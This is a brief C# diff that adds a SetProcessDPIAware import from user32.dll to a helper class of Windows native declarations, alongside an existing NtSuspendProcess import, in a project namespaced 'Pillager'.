@@ -8,6 +8,8 @@ namespace Pillager.Helper
 {
     public static class Native
     {
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool SetProcessDPIAware();
         [DllImport("ntdll", SetLastError = true)]
         public static extern uint NtSuspendProcess([In] IntPtr Handle);
         [DllImport("ntdll.dll", SetLastError = false)]
